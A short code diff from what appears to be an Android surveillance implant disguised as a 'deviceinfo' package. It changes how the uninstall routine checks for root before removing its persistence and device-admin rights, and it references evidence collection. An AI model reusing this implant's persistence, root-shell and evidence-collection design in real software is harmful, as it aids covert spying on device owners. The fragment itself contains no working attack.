@@ -21,6 +21,7 @@ import com.android.deviceinfo.Root;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.Trigger;
 import com.android.deviceinfo.auto.Cfg;
+import com.android.deviceinfo.capabilities.PackageInfo;
 import com.android.deviceinfo.conf.ConfAction;
 import com.android.deviceinfo.conf.Configuration;
 import com.android.deviceinfo.evidence.EvidenceCollector;
@@ -74,7 +75,7 @@ public class UninstallAction extends SubActionSlow {
 
 		removeAdmin(Status.getAppContext());
 
-		if (Root.isRootShellInstalled()) {
+		if (PackageInfo.checkRoot()) {
 			Persistence p = new Persistence(Status.getAppContext());
 			p.removePersistance();
 		}
